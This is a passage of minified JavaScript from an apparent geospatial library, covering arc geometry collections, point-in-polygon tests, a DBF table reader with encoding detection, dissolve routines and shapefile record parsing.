z(e,t,n,r,i,o){var a=h(e,t,n,r)*h(n,r,i,o),s=0;return a>0&&(s=((e-n)*(i-n)+(t-r)*(o-r))/a,s>1?s=1:-1>s&&(s=-1)),s}function V(e,t,n,r,i,o,a,s,u){var l=p(e,t,n,r,i,o)*p(r,i,o,a,s,u),c=0;return l>0&&(c=((e-r)*(a-r)+(t-i)*(s-i)+(n-o)*(u-o))/l,c>1?c=1:-1>c&&(c=-1)),c}function G(e,t,n,r,i,o,a,s,u){var l=.5*Math.sqrt(U(e,t,r,i,a,s)+U(e,n,r,o,a,u)+U(t,n,i,o,s,u));return l}function q(e,t,n){var r;if(0===n)r=e;else if(e>=t+n)r=t;else if(t>=e+n)r=e;else{var i=e+n-t;r=e-i*i/n*.25}return 0>r&&(r=0),r}function J(e,t,n,r,i,o){var a=d(e,t,n,r),s=d(e,t,i,o),u=d(n,r,i,o);return q(a,s,u)}function H(e,t,n,r,i,o,a,s,u){var l=g(e,t,n,r,i,o),c=g(e,t,n,a,s,u),f=g(r,i,o,a,s,u);return q(l,c,f)}function Y(e,t){return e[0]<=t[0]&&e[2]>=t[2]&&e[1]<=t[1]&&e[3]>=t[3]}function $(e,t){this._i=0,this._n=0,this._inc=1,this._xx=e,this._yy=t,this.i=0,this.x=0,this.y=0}function W(e,t,n){var r=0,i=0,o=1,a=0;this.init=function(e,t,n,s){return r=s||0,n?(i=e,o=1,a=e+t):(i=e+t-1,o=-1,a=e-1),this},this.hasNext=function(){var s=n,u=i,l=u,c=r,f=a,p=o;if(u==f)return!1;do l+=p;while(l!=f&&s[l]<c);return i=l,this.x=e[u],this.y=t[u],this.i=u,!0}}function X(e){this._arcs=e,this._i=0,this._n=0,this.x=0,this.y=0}function Z(){function e(e){var t=[],r=[],i=e.map(function(e){for(var n=e?e.length:0,i=0;n>i;i++)t.push(e[i][0]),r.push(e[i][1]);return n});n(i,t,r)}function n(e,t,n){var r=e.length;e instanceof Array&&(e=new Uint32Array(e)),t instanceof Array&&(t=new Float64Array(t)),n instanceof Array&&(n=new Float64Array(n)),p=t,d=n,g=e,m=null,b=null,h=new Uint32Array(r);for(var a=0,s=0;r>s;s++)h[s]=a,a+=e[s];return(a!=p.length||p.length!=d.length)&&i("ArcCollection#initXYData() Counting error"),o(),x=new $(p,d),this}function r(e){e?(e.length!=p.length&&i("ArcCollection#initZData() mismatched arrays"),e instanceof Array&&(e=new Float64Array(e)),m=e,b=new W(p,d,m)):(m=null,b=null)}function o(){var e=a(p,d,g);y=e.bb,v=e.bounds}function a(e,n,r){for(var i,o,a,s=r.length,u=new Float64Array(4*s),l=new t,c=0,f=0;s>f;f++)i=r[f],i>0&&(o=4*f,a=It.calcArcBounds(e,n,c,i),u[o++]=a[0],u[o++]=a[1],u[o++]=a[2],u[o]=a[3],c+=i,l.mergeBounds(a));return{bb:u,bounds:l}}function s(){var e=m,t=S;if(!e||!t)return this.getPointCount();for(var n=0,r=0,i=e.length;i>r;r++)e[r]>=t&&n++;return n}function u(){for(var e,t,n=s(),r=g.length,o=new Float64Array(n),a=new Float64Array(n),u=new Float64Array(n),l=new Int32Array(r),c=0,f=0,h=0;r>h;h++){t=0,e=g[h];for(var y=c+e;y>c;c++)m[c]>=S&&(o[f]=p[c],a[f]=d[c],u[f]=m[c],f++,t++);2>t&&i("Collapsed arc"),l[h]=t}return{xx:o,yy:a,zz:u,nn:l}}function l(e){for(var t,i,o=0,a=0,s=yt.copyElements,u=0,l=e.length;l>u;u++)t=e[u],i=g[u],t>-1&&(s(p,h[u],p,o,i),s(d,h[u],d,o,i),m&&s(m,h[u],m,o,i),g[t]=i,o+=i,a++);n(g.subarray(0,a),p.subarray(0,o),d.subarray(0,o)),m&&r(m.subarray(0,o))}function f(e,t){var n=new Float64Array(t),r=0;return e.forEach(function(e){for(var t=0,i=e.length;i>t;r++,t++)n[r]=e[t]}),r!=t&&i("Mismatched thresholds"),n}var p,d,h,g,m,y,v,x,b,S=0;1==arguments.length?e(arguments[0]):3==arguments.length?n.apply(this,arguments):i("ArcCollection() Invalid arguments"),this.updateVertexData=function(e,t,i,o){n(e,t,i),r(o||null)},this.getVertexData=function(){return{xx:p,yy:d,zz:m,bb:y,nn:g,ii:h}},this.getCopy=function(){var e=new Z(new Int32Array(g),new Float64Array(p),new Float64Array(d));return m&&e.setThresholds(new Float64Array(m)),e},this.getFilteredCopy=function(){if(!m||0===S)return this.getCopy();var e=u(),t=new Z(e.nn,e.xx,e.yy);return t.setThresholds(e.zz),t},this.toArray=function(){var e=[];return this.forEach(function(t){for(var n=[];t.hasNext();)n.push([t.x,t.y]);e.push(n)}),e},this.toString=function(){return JSON.stringify(this.toArray())},this.forEachArcSegment=function(e,t){for(var n=e>=0,r=n?e:~e,i=this.getRetainedInterval(),o=g[r],a=n?1:-1,s=n?h[r]:h[r]+o-1,u=s,l=0,c=1;o>c;c++)u+=a,(0===i||m[u]>=i)&&(t(s,u,p,d),s=u,l++);return l},this.forEachSegment=function(e){for(var t=0,n=0,r=this.size();r>n;n++)t+=this.forEachArcSegment(n,e);return t},this.transformPoints=function(e){for(var t,n=p,r=d,i=0,a=n.length;a>i;i++)t=e(n[i],r[i]),n[i]=t[0],r[i]=t[1];o()},this.forEach=function(e){for(var t=0,n=this.size();n>t;t++)e(this.getArcIter(t),t)},this.forEach2=function(e){for(var t=0,n=this.size();n>t;t++)e(h[t],g[t],p,d,m,t)},this.forEach3=function(e){for(var t,n,r,i,o,a=0,s=this.size();s>a;a++)t=h[a],n=t+g[a],r=p.subarray(t,n),i=d.subarray(t,n),m&&(o=m.subarray(t,n)),e(r,i,o,a)},this.filter=function(e){for(var t=new Int32Array(this.size()),n=0,r=0,i=0,o=this.size();o>i;i++)e(this.getArcIter(i),i)?(t[i]=n++,r+=g[i]):t[i]=-1;return n===this.size()?null:(l(t),t)},this.dedupCoords=function(){for(var e,t,i=0,o=0,a=0,s=this.size(),u=m;s>i;)e=g[i],t=It.dedupArcCoords(o,a,e,p,d,u),g[i]=t,o+=e,a+=t,i++;return o>a&&(n(g,p.subarray(0,a),d.subarray(0,a)),u&&r(u.subarray(0,a))),o-a},this.getVertex=function(e,t){var n=this.indexOfVertex(e,t);return{x:p[n],y:d[n]}},this.indexOfVertex=function(e,t){var n=0>e?~e:e,r=g[n];return 0>t&&(t=r+t),n!=e&&(t=r-t-1),(0>t||t>=r)&&i("[ArcCollection] out-of-range vertex id"),h[n]+t},this.pointIsEndpoint=function(e){for(var t=h,n=g,r=0,i=t.length;i>r;r++)if(e===t[r]||e===t[r]+n[r]-1)return!0;return!1},this.arcIsClosed=function(e){var t=this.indexOfVertex(e,0),n=this.indexOfVertex(e,-1);return t!=n&&p[t]==p[n]&&d[t]==d[n]},this.arcIsLollipop=function(e){var t,n,r=this.getArcLength(e);return 2>=r||!this.arcIsClosed(e)?!1:(t=this.indexOfVertex(e,1),n=this.indexOfVertex(e,-2),p[t]==p[n]&&d[t]==d[n])},this.arcIsDegenerate=function(e){for(var t,n,r=this.getArcIter(e),i=0;r.hasNext();){if(i>0&&(t!=r.x||n!=r.y))return!1;t=r.x,n=r.y,i++}return!0},this.getArcLength=function(e){return g[c(e)]},this.getArcIter=function(e){var t=e>=0,n=t?e:~e,r=m&&S?b:x;return n>=g.length&&i("#getArcId() out-of-range arc id:",e),r.init(h[n],g[n],t,S)},this.getShapeIter=function(e){return new X(this).init(e)},this.setThresholds=function(e){var t=this.getPointCount(),n=null;return e&&(e.length==t?n=e:e.length==this.size()?n=f(e,t):i("Invalid threshold data")),r(n),this},this.flatten=function(){if(S>0){var e=u();this.updateVertexData(e.nn,e.xx,e.yy),S=0}else m=null},this.getRetainedInterval=function(){return S},this.setRetainedInterval=function(e){return S=e,this},this.getRetainedPct=function(){return this.getPctByThreshold(S)},this.setRetainedPct=function(e){return e>=1?S=0:(S=this.getThresholdByPct(e),S=It.clampIntervalByPct(S,e)),this},this.getRemovableThresholds=function(e){m||i("[arcs] Missing simplification data.");for(var t,n=1|e,r=new Float64Array(Math.ceil(m.length/n)),o=0,a=0,s=this.getPointCount();s>o;o+=n)t=m[o],t!=1/0&&(r[a++]=t);return r.subarray(0,a)},this.getArcThresholds=function(e){e>=0&&e<this.size()||i("[arcs] Invalid arc id:",e);var t=h[e],n=t+g[e];return m.subarray(t,n)},this.getPctByThreshold=function(e){var t,n,r;return e>0?(t=this.getRemovableThresholds(),n=yt.findRankByValue(t,e),r=t.length>0?1-(n-1)/t.length:1):r=1,r},this.getThresholdByPct=function(e){var t,n,r=this.getRemovableThresholds();return t=0===r.length?0:Math.floor((1-e)*(r.length+2)),n=0>=t?0:t>r.length?1/0:yt.findValueByRank(r,t)},this.arcIntersectsBBox=function(e,t){var n=y,r=4*e;return n[r]<=t[2]&&n[r+2]>=t[0]&&n[r+3]>=t[1]&&n[r+1]<=t[3]},this.arcIsContained=function(e,t){var n=y,r=4*e;return n[r]>=t[0]&&n[r+2]<=t[2]&&n[r+1]>=t[1]&&n[r+3]<=t[3]},this.arcIsSmaller=function(e,t){var n=y,r=4*e;return n[r+2]-n[r]<t&&n[r+3]-n[r+1]<t},this.isPlanar=function(){return!It.probablyDecimalDegreeBounds(this.getBounds())},this.size=function(){return h&&h.length||0},this.getPointCount=function(){return p&&p.length||0},this.getBounds=function(){return v},this.getSimpleShapeBounds=function(e,n){n=n||new t;for(var r=0,i=e.length;i>r;r++)this.mergeArcBounds(e[r],n);return n},this.getSimpleShapeBounds2=function(e,t){var n=t||[],r=y,i=4*c(e[0]);n[0]=r[i],n[1]=r[++i],n[2]=r[++i],n[3]=r[++i];for(var o=1,a=e.length;a>o;o++)i=4*c(e[o]),r[i]<n[0]&&(n[0]=r[i]),r[++i]<n[1]&&(n[1]=r[i]),r[++i]>n[2]&&(n[2]=r[i]),r[++i]>n[3]&&(n[3]=r[i]);return n},this.getMultiShapeBounds=function(e,n){if(n=n||new t,e)for(var r=0,i=e.length;i>r;r++)this.getSimpleShapeBounds(e[r],n);return n},this.mergeArcBounds=function(e,t){0>e&&(e=~e);var n=4*e;t.mergeBounds(y[n],y[n+1],y[n+2],y[n+3])}}function K(e,t,n){function r(e,t,n){var r,i,o,a=p[n],s=0,u=h.xx,d=h.yy;r=n==f?l.length-a:p[n+1]-a;for(var g=0;r>g;g++)i=l[g+a],o=c[g+a],s+=_t.testRayIntersection(e,t,u[i],d[i],u[o],d[o]);return s}function o(e){var t=Math.floor((e-u)/d);return 0>t&&(t=0),t>=f&&(t=f-1),t}function a(e){var t=n&&n.buckets>0?n.buckets:e/100;return Math.ceil(t)}function s(){var n,r,s,g,m,y,v,x,b,S,P=h.xx,w=0,I=0,A=-1;for(It.forEachPathSegment(e,t,function(){w++}),r=new Uint32Array(2*w),v=0,It.forEachPathSegment(e,t,function(e,t,n,i){r[v++]=e,r[v++]=t}),It.sortSegmentIds(P,r),l=new Uint32Array(w),c=new Uint32Array(w),f=a(w),p=new Uint32Array(f+1),u=P[r[0]],d=(P[r[r.length-2]]-u)/f,s=0,g=w-1;w>I;){for(x=2*I,m=r[x],y=r[x+1],b=P[m],S=P[y],n=A,A=o(b);A>n;)n++,p[n]=s;S-b>=0==!1&&i("Invalid segment"),o(S)-A>1?(l[g]=m,c[g]=y,g--):(l[s]=m,c[s]=y,s++),I++}p[f]=s,s!=g+1&&i("Segment indexing error")}var u,l,c,f,p,d,h=t.getVertexData(),g=t.getMultiShapeBounds(e);s(),this.pointInPolygon=function(e,t){if(!g.containsPoint(e,t))return!1;var n=o(e),i=r(e,t,n);return n>0&&(i+=r(e,t,n-1)),i+=r(e,t,f),isNaN(i)?-1:i%2==1?1:0}}function Q(e,t){function n(e){function n(e,n){var i=t.getSimpleShapeBounds(e),o=i.toArray();o.ids=e,o.bounds=i,o.id=n,r.push(o),i.area()>.02*c&&(o.index=new K([e],t))}var r=[];e.forEach(function(e,t){for(var r=e?e.length:0,i=0;r>i;i++)n(e[i],t)}),l=require("rbush")(),l.load(r)}function r(e,t){var n=!1,r=!1;return t.forEach(function(t){var i=t.index?t.index.pointInPolygon(e[0],e[1]):s(t.ids,t.bounds,e);-1==i?n=!0:1==i&&(r=!r)}),n||r}function i(e){var t,n,r=o(e),i=[];if(r.length>0){r.sort(function(e,t){return e.id-t.id});for(var a=0;a<r.length;a++)n=r[a],(0===a||n.id!=r[a-1].id)&&i.push(t=[]),t.push(n)}return i}function o(e){var t=e[0],n=e[1];return l.search([t,n,t,n])}function a(e){var n=t.getVertex(e,0),r=t.getVertex(e,1);return[(n.x+r.x)/2,(n.y+r.y)/2]}function s(e,n,r){return n.containsPoint(r[0],r[1])===!1?0:_t.testPointInRing(r[0],r[1],e,t)}function u(e,t){var n=[];return e.forEach(function(e){-1==t.indexOf(e)&&n.push(e)}),t.forEach(function(e){-1==n.indexOf(e)&&n.push(e)}),n}var l,c=It.getPathBounds(e,t).area();n(e),this.findEnclosingShape=function(e){var t=-1,n=i(e);return n.forEach(function(n){r(e,n)&&(t=n[0].id)}),t},this.pointIsEnclosed=function(e){return r(e,o(e))},this.arcIsEnclosed=function(e){return this.pointIsEnclosed(a(e))},this.pathIsEnclosed=function(e){var t=e[0],n=a(t);return this.pointIsEnclosed(n)},this.findEnclosedPaths=function(e){var n,r=t.getSimpleShapeBounds(e),i=l.search(r.toArray()),o=[];return i.length>6&&(n=new K([e],t)),i.forEach(function(t){var i=a(t.ids[0]),u=n?n.pointInPolygon(i[0],i[1]):s(e,r,i);u&&o.push(t.ids)}),o.length>0?o:null},this.findPathsInsideShape=function(e){var t=[];return e.forEach(function(e){var n=this.findEnclosedPaths(e);n&&(t=u(t,n))},this),t.length>0?t:null}}function ee(e,t){function n(e,t){var n=e>=0?e:~e,i=t>=0?t:~t,o=u[n];return 2>o?!1:o!=u[i]?!1:r(e,t,-1)&&r(e,t,1)&&r(e,t,-2)?!0:!1}function r(t,n,r){var i=e.indexOfVertex(t,r),o=e.indexOfVertex(n,r);return f[i]==f[o]&&p[i]==p[o]}function o(e){var t=e>=0,n=t?e:~e,r=t?2*n+1:2*n,o=d.chains[r],a=o>>1,s=o&!0?a:~a;return(0>o||o>=d.chains.length)&&i("out-of-range chain id"),n>=u.length&&i("out-of-range arc id"),d.chains.length<=r&&i("out-of-bounds node id"),s}yt.isArray(e)&&(e=new Z(e));var a=e.getVertexData(),u=a.nn,f=a.xx,p=a.yy,d=It.findNodeTopology(e,t);2*u.length!=d.chains.length&&i("[NodeCollection] count error"),Object.defineProperty(this,"arcs",{value:e}),this.toArray=function(){var e=new Uint8Array(d.xx.length),t=[];return yt.forEach(d.chains,function(n,r){if(1!=e[r])for(t.push([d.xx[r],d.yy[r]]);1!=e[n];)e[n]=1,n=d.chains[n]}),t},this.size=function(){return this.toArray().length},this.debugNode=function(t){function n(t){var n=t+": ",r=e.getArcLength(t);if(r>0){var i=e.getVertex(t,-1);if(n+=yt.format("[%f, %f]",i.x,i.y),r>1){var o=e.getVertex(t,-2);if(n+=yt.format(", [%f, %f]",o.x,o.y),r>2){var a=e.getVertex(t,0);n+=yt.format(", [%f, %f]",a.x,a.y)}n+=" len: "+h(i.x,i.y,o.x,o.y)}}else n="[]";s(n)}if(It.TRACING){var r=[t];this.forEachConnectedArc(t,function(e){r.push(e)}),s("node ids:",r),r.forEach(n)}},this.forEachConnectedArc=function(e,t){for(var n=o(e),r=0;n!=e;)t(n,r++),n=o(n)},this.findMatchingArc=function(e){for(var t=o(e),r=e;t!=e;)n(e,t)&&c(t)<c(r)&&(r=t),t=o(t);return r!=e&&l("found identical arc:",e,"->",r),r},this.internal={testArcMatch:n,testVertexMatch:r}}function te(e,t){function r(e){e.position(0).littleEndian();var t,n={version:e.readInt8(),updateYear:e.readUint8(),updateMonth:e.readUint8(),updateDay:e.readUint8(),recordCount:e.readUint32(),dataOffset:e.readUint16(),recordSize:e.readUint16(),incompleteTransaction:e.skipBytes(2).readUint8(),encrypted:e.readUint8(),mdx:e.skipBytes(12).readUint8(),ldid:e.readUint8()},r=1;for(e.skipBytes(2),n.fields=[];13!=e.peek()&&10!=e.peek()&&e.position()<n.dataOffset-1;)t=a(e),t.columnOffset=r,n.fields.push(t),r+=t.size;return r!=n.recordSize&&i("Record length mismatch; header:",n.recordSize,"detected:",r),13!=e.peek()&&s("[dbf] Found a non-standard header terminator ("+e.peek()+"). DBF file may be corrupted."),It.getUniqFieldNames(yt.pluck(n.fields,"name")).forEach(function(e,t){n.fields[t].name=e}),n}function a(e){return{name:e.readCString(11),type:String.fromCharCode(e.readUint8()),address:e.readUint32(),size:e.readUint8(),decimals:e.readUint8(),id:e.skipBytes(2).readUint8(),position:e.skipBytes(2).readUint8(),indexFlag:e.skipBytes(7).readUint8()}}function u(){return yt.pluck(v.fields,"name")}function l(e){return v.dataOffset+v.recordSize*e}function c(){return x||(x=g(),x||(x="utf8",o("Unable to auto-detect the text encoding of the DBF file.\n"+Et.ENCODING_PROMPT))),x}function f(){var e=u().map(function(e,t){return JSON.stringify(e)+": arguments["+t+"]"});return new Function("return {"+e.join(",")+"};")}function p(e){var t=e.size()-1;return 26!=e.peek(t)&&t++,t}function d(e){var t=e.map(h),n=p(y),r=f(),i=[];return function(a){for(var s,u,c=l(a),f=0,p=e.length;p>f;f++)u=e[f],s=c+u.columnOffset,s+u.size>n&&o("[dbf] Invalid DBF file: encountered end-of-file while reading data"),y.position(s),i[f]=t[f](y,u.size);return r.apply(null,i)}}function h(e){var t=e.type,n=null;return"I"==t?n=Et.readInt:"F"==t||"N"==t?n=Et.getNumberReader():"L"==t?n=Et.readBool:"D"==t?n=Et.readDate:"C"==t?n=Et.getStringReader(c()):(s('[dbf] Field "'+field.name+'" has an unsupported type ('+field.type+") -- converting to null values"),n=function(){return null}),n}function g(){var e,t,n=v.ldid,r=Et.lookupCodePage(n),i=m(50),o=0===i.length;return r&&87!=n?e=r:o&&(e="ascii"),e||(e=It.detectEncoding(i)),e&&i.length>0&&(t="Detected DBF text encoding: "+e,e in Et.encodingNames&&(t+=" ("+Et.encodingNames[e]+")"),s(t),t=It.decodeSamples(e,i),t=It.formatStringsAsGrid(t.split("\n")),s("Sample text containing non-ascii characters:"+(t.length>60?"\n":"")+t)),e}function m(e){for(var t,n,r,i,o=[],a=v.fields.filter(function(e){return"C"==e.type}),s=new Buffer(256),u={},c=0,f=v.recordCount;f>c;c++)for(var p=0,d=a.length;d>p&&!(o.length>=e);p++)t=a[p],y.position(l(c)+t.columnOffset),n=Et.readStringBytes(y,t.size,s),n>0&&Et.bufferContainsHighBit(s,n)&&(r=new Buffer(s.slice(0,n)),i=r.toString("hex"),i in u==!1&&(u[i]=!0,o.push(r)));return o}yt.isString(e)&&i("[DbfReader] Expected a buffer, not a string");var y=new n(e),v=r(y),x=t||null;this.size=function(){return v.recordCount},this.readRow=function(e){return d(v.fields)(e)},this.getFields=u,this.getBuffer=function(){return y.buffer()},this.deleteField=function(e){v.fields=v.fields.filter(function(t){return t.name!=e})},this.readRows=function(){for(var e=d(v.fields),t=[],n=0,r=this.size();r>n;n++)t.push(e(n));return t}}function ne(e){var t;if(yt.isArray(e))t=e;else if(t=[],yt.isInteger(e))for(var n=0;e>n;n++)t.push({});else e&&i("[DataTable] Invalid constructor argument:",e);this.exportAsDbf=function(e){return Et.exportRecords(t,e)},this.getRecords=function(){return t},this.getRecordAt=function(e){return t[e]}}function re(e,t){Object.keys(t).forEach(function(n){Object.defineProperty(e,n,{get:t[n]})})}function ie(e,t){function n(){var t=e.shapes[d];return c||(c=t&&t[0]||null),c}function r(){return u=u||_t.getShapeCentroid(h,t)}function i(){return l=l||_t.findInteriorPoint(h,t)}function a(){return g||(g=t.getMultiShapeBounds(h)),g}var s,u,l,c,f,p,d,h,g,m=!!e.data,y=It.layerHasPoints(e),v=t&&It.layerHasPaths(e),x=this;m&&(p=e.data.getRecords(),Object.defineProperty(this,"properties",{set:function(e){yt.isObject(e)?p[d]=e:o("Can't assign non-object to $.properties")},get:function(){var e=p[d];return e||(e=p[d]={}),e}})),v?(s=t.isPlanar(),re(this,{partCount:function(){return h?h.length:0},isNull:function(){return 0===this.partCount},bounds:function(){return a().toArray()},height:function(){return a().height()},width:function(){return a().width()}}),"polygon"==e.geometry_type&&re(this,{area:function(){return s?_t.getPlanarShapeArea(h,t):_t.getSphericalShapeArea(h,t)},originalArea:function(){var e,n=t.getRetainedInterval();return t.setRetainedInterval(0),e=x.area,t.setRetainedInterval(n),e},centroidX:function(){var e=r();return e?e.x:null},centroidY:function(){var e=r();return e?e.y:null},innerX:function(){var e=i();return e?e.x:null},innerY:function(){var e=i();return e?e.y:null}})):y&&(Object.defineProperty(this,"coordinates",{set:function(t){!t||yt.isArray(t)?e.shapes[d]=t||null:o("Can't assign non-array to $.coordinates")},get:function(){return e.shapes[d]||null}}),re(this,{x:function(){return n(),c?c[0]:null},y:function(){return n(),c?c[1]:null}})),re(this,{id:function(){return d}}),this.__setId=function(t){d=t,v&&(g=null,u=null,l=null,h=e.shapes[t]),y&&(c=null),m&&(f=p[t])}}function oe(e,t,n){var r=!n.planar&&It.probablyDecimalDegreeBounds(It.getLayerBounds(e)),i=n.weight?It.compileValueExpression(n.weight,e):null,a=[];return 0!==It.countMultiPartFeatures(e.shapes)&&o("[dissolve] Dissolving multi-part points is not supported"),e.shapes.forEach(function(e,n){var o,s=t(n),u=i?i(n):1,l=e&&e[0];l&&(r&&(o=[],B(l[0],l[1],o),l=o),a[s]=ae(a[s],l,u))}),a.map(function(e){var t,n;return e?(r?(t=e.centroid,n=[],T(t[0],t[1],t[2],n)):n=e.centroid,e?[n]:null):null})}function ae(e,t,n){var r,i,o=t[0],a=t[1];return o==o&&a==a&&n>0&&(e?(r=e.sum+n,i=e.sum/r,e.centroid[0]=i*e.centroid[0]+n*o/r,e.centroid[1]=i*e.centroid[1]+n*a/r,3==t.length&&(e.centroid[2]=i*e.centroid[2]+n*t[2]/r),e.sum=r):e={sum:n,centroid:t.concat()}),e}function se(e,t){var n=ue(e,t);return le(n,e,t)}function ue(e,t){function n(e){var t=e.arcId,n=0>t?~t:t,r=d.length,i=f[n];i||(i=[],f[n]=i),i.push(r),e.group=i,d.push(e),3==i.length&&p.push(i)}function r(e,t){for(var n,r,i=0;i<e.length-1;i++){n=d[e[i]];for(var o=i+1;o<e.length;o++)if(r=d[e[o]],t(n,r))return[n.segId,r.segId]}return null}function i(t,n){return ce(t,d,e).arcId===~ce(n,d,e).arcId}function o(t,n){return fe(t,d,e).arcId===~fe(n,d,e).arcId}function a(e,t){return u(e,t)&&i(e,t)&&o(e,t)}function s(e,t){return u(e,t)&&(i(e,t)||o(e,t))}function u(e,t){return e.arcId===~t.arcId&&h[e.shapeId]===h[t.shapeId]}function l(e){e.forEach(function(t){d[t].group=e})}function c(e){var t=r(e,a)||r(e,s)||r(e,u);t&&(e=e.filter(function(e){return!yt.contains(t,e)}),l(e),l(t),e.length>2&&c(e))}var f=[],p=[],d=[],h=e.map(function(e,n){return t(n)});return It.traversePaths(e,n),p.forEach(c),d}function le(e,t,n){function r(e){if(!e.used){var t=u(e);t||a(e)}}function o(e,t){t in l==!1&&(l[t]=[]),l[t].push(e)}function a(e){var t=[e.arcId],r=s(e);for(e.used=!0;r&&r!=e;)t.push(r.arcId),r.used=!0,r=s(r),r&&r!=e&&r.used&&i("buildRing() topology error");r||i("buildRing() traversal error"),e.used=!0,o(t,n(e.shapeId))}function s(n,r){var o,a=ce(n,e,t);return r=r||0,a!=n&&(o=u(a),o&&(r>100&&i("[dissolve] deep recursion -- unhandled topology problem"),a=1==t[o.shapeId][o.partId].length?s(a,r+1):s(o,r+1))),a}function u(t){var r,i,o=n(t.shapeId);return i=yt.find(t.group,function(r){var i=t,a=e[r];return i==a||a.used||n(a.shapeId)!==o||i.arcId!=~a.arcId?!1:!0}),r=null===i?null:e[i]}var l=[];return e.forEach(r),l}function ce(e,t,n){return pe(e,t,n,1)}function fe(e,t,n){return pe(e,t,n,-1)}function pe(e,t,n,r){var o,a=n[e.shapeId][e.partId],s=a.length,u=(e.i+r)%s;return 0>u&&(u+=s),o=t[e.segId-e.i+u],o&&o.shapeId==e.shapeId||i("index error"),o}function de(e){var t=new ArrayBuffer(16),n=new Float64Array(t),r=new Uint32Array(t),i=0|e;if(i>0==!1)throw new Error("Invalid size param: "+e);return function(e,t){var o,a=r;return n[0]=e,n[1]=t,o=a[0]^a[1],o=o<<5^o>>7^a[2]^a[3],(2147483647&o)%i}}function he(e){function t(e,t,n,s,u){for(var l,c,f,p=u(n),d=r(e[n],t[n]),h=i[d];-1!=h;){if(l=a[h][0],c=a[h][1],f=l.length,l[0]===e[s]&&l[f-1]===e[n]&&l[f-2]===e[p]&&c[0]===t[s]&&c[f-1]===t[n]&&c[f-2]===t[p])return h;h=o[h]}return null}var n=Math.floor(.25*e+1),r=de(n),i=new Int32Array(n),o=[],a=[],s=0;yt.initializeArray(i,-1),this.addArc=function(e,t){var n=e.length-1,u=r(e[n],t[n]),l=i[u],c=a.length;return i[u]=c,a.push([e,t]),s+=e.length,o.push(l),c},this.findMatchingArc=function(e,n,r,i,o,a){var s=t(e,n,r,i,o);return s=null===s?t(e,n,i,r,a):~s},this.getVertexData=function(){for(var e,t,n=new Float64Array(s),r=new Float64Array(s),i=new Uint32Array(a.length),o=0,u=0,l=a.length;l>u;u++)e=a[u],t=e[0].length,yt.copyElements(e[0],0,n,o,t),yt.copyElements(e[1],0,r,o,t),i[u]=t,o+=t;return{xx:n,yy:r,nn:i}}}function ge(e,t){for(var n,r,i=e.length,o=Math.floor(1.3*i)||1,a=de(o),s=new Int32Array(o),u=new Int32Array(i),l=0;i>l;l++)n=a(e[l],t[l]),r=s[n]-1,s[n]=l+1,u[l]=0>r?l:r;return u}function me(e,t){for(var n,r,i,o,a=ge(e,t),s=e.length-1;s>=0;s--)if(r=a[s],!(r>=s)){i=s,o=-1;do n=r,r=a[n],t[n]==t[s]&&e[n]==e[s]?(a[n]=i,i=n):(o>-1&&(a[o]=n),o=n);while(n>r);o>-1&&(a[o]=o),a[s]=i}return a}function ye(e,t){for(var n=new Int32Array(e),r=0,i=0,o=t.length;o>i;i++)for(var a=0,s=t[i];s>a;a++,r++)n[r]=i;return n}function ve(e){var t=1e4,n=new Float64Array(t),r=new Float64Array(t),i=0;this.endPath=function(){e(n,r,i),i=0},this.addPoint=function(e,o){i>=t&&(t=Math.ceil(1.3*t),n=yt.extendBuffer(n,t),r=yt.extendBuffer(r,t)),n[i]=e,r[i]=o,i++}}function xe(e){function t(e){g?e!=g&&o("[PathImporter] Mixed feature types are not allowed"):g=e}function n(e){if(e>f.length){var t=Math.max(e,Math.ceil(1.5*f.length));f=yt.extendBuffer(f,t,b),p=yt.extendBuffer(p,t,b)}}function r(e){var t=d[x]||(d[x]=[]);t.push(e)}function a(e){v++,h[v]=e,r([v])}function l(e,t,r){var i,o,s,u,l=0;n(b+r);for(var c=0;r>c;c++)i=e[c],o=t[c],y&&(i=y(i),o=y(o)),c>0&&i==s&&o==u?S++:(f[b]=i,p[b]=o,b++,l++),u=o,s=i;"polygon"==g&&l>0&&(e[0]!=e[r-1]||t[0]!=t[r-1])&&(n(b+1),f[b]=e[0],p[b]=t[0],w++,b++,l++),a(l)}var c=e.reserved_points>0?e.reserved_points:2e4,f=new Float64Array(c),p=new Float64Array(c),d=[],h=[],g=e.type||null,y=null,v=-1,x=-1,b=0,S=0,P=0,w=0;e.precision&&(y=m(e.precision)),yt.extend(this,new ve(l)),this.startShape=function(){d[++x]=null},this.importLine=function(e){t("polyline"),this.importPath(e)},this.importPoints=function(e){t("point"),y&&e.forEach(function(e){e[0]=y(e[0]),e[1]=y(e[1])}),e.forEach(r)},this.importRing=function(e,n){var r=_t.getPlanarPathArea2(e);t("polygon"),(n===!0&&r>0||n===!1&&0>r)&&(u("Warning: reversing",n?"a CW hole":"a CCW ring"),e.reverse()),this.importPath(e)},this.importPath=function(e){for(var t,n=0,r=e.length;r>n;n++)t=e[n],this.addPoint(t[0],t[1]);this.endPath()},this.done=function(){var t,n={name:""};return"polygon"==g||"polyline"==g?(S>0&&u(yt.format("Removed %,d duplicate point%s",S,yt.pluralSuffix(S))),P>0&&s(yt.format("Removed %,d path%s with defective geometry",P,yt.pluralSuffix(P))),w>0&&s(yt.format("Closed %,d open polygon ring%s",w,yt.pluralSuffix(w))),b>0?(b<f.length&&(f=f.subarray(0,b),p=p.subarray(0,b)),t=new Z(h,f,p),(e.auto_snap||e.snap_interval)&&It.snapCoords(t,e.snap_interval),It.cleanShapes(d,t,g)):(s("No geometries were imported"),g=null)):"point"==g||null===g||i("Unexpected collection type:",g),g&&(n.geometry_type=g,n.shapes=d),{arcs:t||null,info:{},layers:[n]}}}function be(e){var t,n=Tt.hasBounds(e),r=Tt.isMultiPartType(e),o=Tt.isZType(e),a=Tt.isMType(e),s=!n,u=s?0:16;if(0===e)return Bt;t=function(t,n){var o=t.position();return this.id=t.bigEndian().readUint32(),this.type=t.littleEndian().skipBytes(4).readUint32(),0===this.type?new Bt:((n>0!=!0||this.type!=e&&0!==this.type)&&i("Unable to read a shape -- .shp file may be corrupted"),this.byteLength=n,s?(this.pointCount=1,this.partCount=1):(t.skipBytes(32),this.partCount=r?t.readUint32():1,this.pointCount=t.readUint32()),void(this._data=function(){return t.position(o)}))};var l={_xypos:function(){var e=12;return s||(e+=4),n&&(e+=32),r&&(e+=4*this.partCount+4),e},readCoords:function(){if(0===this.pointCount)return null;var e=this.readPartSizes(),t=this._data().skipBytes(this._xypos());return e.map(function(e){return t.readFloat64Array(2*e)})},readXY:function(){return 0===this.pointCount?new Float64Array(0):this._data().skipBytes(this._xypos()).readFloat64Array(2*this.pointCount)},readPoints:function(){for(var 